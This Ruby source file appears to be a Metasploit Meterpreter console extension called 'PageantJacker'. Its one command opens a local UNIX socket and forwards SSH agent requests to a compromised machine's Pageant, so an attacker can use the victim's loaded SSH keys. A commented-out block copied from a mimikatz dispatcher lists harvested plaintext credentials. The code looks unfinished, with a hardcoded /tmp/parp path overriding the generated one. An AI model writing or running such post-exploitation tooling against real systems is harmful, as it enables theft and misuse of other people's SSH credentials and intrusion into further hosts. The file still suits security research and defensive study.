# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

require 'tmpdir'

###
#
# PageantJacker extension - Hijack Pageant
#
###
class Console::CommandDispatcher::PageantJacker

  Klass = Console::CommandDispatcher::PageantJacker

  include Console::CommandDispatcher

  def initialize(shell)
    super
  end

  #  if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
  #    print_line
  #    print_warning "Loaded x86 PageantJacker on an x64 architecture."
  #  end
  #end

  #
  # List of supported commands.
  #
  def commands
    {
      "start_pageant_forwarding" => "Create a local socket and forward all requests to the remote Pageant",
    }
  end

  def cmd_start_pageant_forwarding(*args) 
    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    sockpath = "/tmp/parp"
    ::File.delete sockpath
    if ::File.exists?(sockpath)
        print_line("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
        return
    end

    ::UNIXServer.open(sockpath) {|serv|
      print_line("Launched listening socket on #{sockpath}.")
      print_line("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
      print_line("Now use any tool normally (e.g. ssh-add)")
     
      loop { 
        s = serv.accept
        loop {
          socket_request_data = s.recvfrom(8192)
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          
          #puts socket_request_data.first.inspect
          #puts socket_request_data.first.unpack('NCH*')

          #puts 'Request'
          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
            
          if !response_data.nil?
            #puts "Response Data\n"
            #resp = response_data.unpack('NCH*')
            #puts "resp size #{resp[0]} resp type: #{resp[1]} actual_size #{resp[2].size+5}"
            #puts "resp #{resp[2].unpack('H*').first}"
            s.send response_data,0
          end
        }
      }
    }

    if ::File.exists?(sockpath)
        print_line("Cleaning up; removing #{sockpath}")
        ::File.delete(sockpath)
    else
        print_line("Unable to remove socket #{sockpath}")
    end
  end


#  @@command_opts = Rex::Parser::Arguments.new(
#    "-f" => [true, "The function to pass to the command."],
#    "-a" => [true, "The arguments to pass to the command."],
#    "-h" => [false, "Help menu."]
#  )
#
#  def cmd_mimikatz_command(*args)
#    if (args.length == 0)
#      args.unshift("-h")
#    end
#
#    cmd_args = nil
#    cmd_func = nil
#    arguments = []
#
#    @@command_opts.parse(args) { |opt, idx, val|
#      case opt
#        when "-a"
#          cmd_args = val
#        when "-f"
#          cmd_func = val
#        when "-h"
#          print(
#            "Usage: mimikatz_command -f func -a args\n\n" +
#            "Executes a mimikatz command on the remote machine.\n" +
#            "e.g. mimikatz_command -f sekurlsa::wdigest -a \"full\"\n" +
#            @@command_opts.usage)
#          return true
#      end
#    }
#
#    unless cmd_func
#      print_error("You must specify a function with -f")
#      return true
#    end
#
#    if cmd_args
#      arguments = cmd_args.split(" ")
#    end
#
#    print_line client.mimikatz.send_custom_command(cmd_func, arguments)
#  end
#
#  def mimikatz_request(provider, method)
#    print_status("Retrieving #{provider} credentials")
#    accounts = method.call
#
#    table = Rex::Ui::Text::Table.new(
#      'Header' => "#{provider} credentials",
#      'Indent' => 0,
#      'SortIndex' => 4,
#      'Columns' =>
#      [
#        'AuthID', 'Package', 'Domain', 'User', 'Password'
#      ]
#    )
#
#    accounts.each do |acc|
#      table << [acc[:authid], acc[:package], acc[:domain], acc[:user], (acc[:password] || "").gsub("\n","")]
#    end
#
#    print_line table.to_s
#
#    return true
#  end

  #
  # Name for this dispatcher
  #
  def name
    "PageantJacker"
  end
end

end
end
end
end

